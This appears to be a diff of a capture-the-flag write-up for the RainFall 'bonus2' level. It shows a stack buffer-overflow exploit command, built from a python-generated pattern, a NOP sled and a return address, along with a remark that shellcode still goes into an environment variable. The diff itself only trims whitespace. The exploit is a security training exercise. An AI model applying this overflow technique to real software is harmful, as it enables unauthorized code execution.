@@ -7,7 +7,7 @@ ssh bonus2@localhost -p 4343
 
 We found a binary named bonus2. When we run it we obtain:
 ```sh
-bonus2@RainFall:~$ ./bonus2 
+bonus2@RainFall:~$ ./bonus2
 Segmentation fault (core dumped)
 bonus2@RainFall:~$
 ```
@@ -33,11 +33,7 @@ For this we use our small [program](./env_variable_finder.c) for this step.
 In this one, the address is: `0xbffffe57`.
 
 
-
-
-
-
-./bonus2 $(python -c 'print("aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09" + " " + "\x90"*18 + "\x01\xff\xff\xbf")') 
+./bonus2 $(python -c 'print("aA00aA01aA02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09cA00cA01cA02cA03cA04cA05cA06cA07cA08cA09dA00dA01dA02dA03dA04dA05dA06dA07dA08dA09" + " " + "\x90"*18 + "\x01\xff\xff\xbf")')
 
 need to add shellcode into ENV variable.
 
